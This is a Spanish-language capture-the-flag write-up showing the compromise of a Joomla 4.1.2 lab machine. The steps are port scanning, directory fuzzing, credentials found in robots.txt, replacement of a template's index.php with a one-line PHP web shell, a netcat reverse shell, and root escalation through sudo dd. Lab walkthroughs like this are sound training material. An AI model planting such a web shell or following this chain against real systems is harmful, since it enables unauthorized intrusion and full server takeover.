Escaneo de puertos con Nmap:

![](../../../Images/Pasted%20image%2020240830091228.png)

Observo lo que corre por el puerto 80:

![](../../../Images/Pasted%20image%2020240830092239.png)

Tengo un panel de Login web, pero no tengo ningunas credenciales

Así que haré fuzzing web con Gobuster para encontrar directorios que me puedan dar alguna pista

![](../../../Images/Pasted%20image%2020240830092505.png)

Encontré un /robots.txt, accederé a el:

![](../../../Images/Pasted%20image%2020240830092543.png)

Y encuentro una credenciales, pero al parecer esa contraseña está codificada así que procederé a decodificarla:

![](../../../Images/Pasted%20image%2020240830092614.png)

Entonces tengo admin:sanluis12345, pero haciendo el fuzzing también encontré un /administrator accedo a él con estas credenciales:

![](../../../Images/Pasted%20image%2020240830092737.png)

![](../../../Images/Pasted%20image%2020240830092754.png)

Y estoy dentro de la página web, estoy ante un Joomla v4.1.2

Ahora continuaré a enviarme una reverse shell, para hacerlo voy a `system > Templates > Site Templates > Cassiopeia Details and Files`. Una vez ahí editaré el index.php borrando todo y solo dejando el siguiente codigo:
```
php
<?php
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```
![](../../../Images/Pasted%20image%2020240901154341.png)

Lo guardo y voy a la pagina web del inicio pero ahora me lanzo la rev shell y me pongo a la escucha con Netcat:

![](../../../Images/Pasted%20image%2020240901154620.png)

Recibo la conexión y hago el tratamiento de la TTY

![](../../../Images/Pasted%20image%2020240901154653.png)

## ESCALADA DE PRIVILEGIOS

Revisando en la carpeta /var/backups/hidden, encuentro un .txt que me proporciona una contraseña

![](../../../Images/Pasted%20image%2020240901154835.png)

Escalo al usuario luisillo con esta posible contraseña:

![](../../../Images/Pasted%20image%2020240901154941.png)

Ahora soy luisillo

Ejecuto sudo -l para ver el binario que puedo usar

![](../../../Images/Pasted%20image%2020240901155022.png)

Puedo ser root con el binario Dd

Miro en GTFOBins como puedo escalar con este binario:

![](../../../Images/Pasted%20image%2020240901155313.png)

Lo ejecuto:

![](../../../Images/Pasted%20image%2020240901155254.png)

Y listo, ya soy ROOT
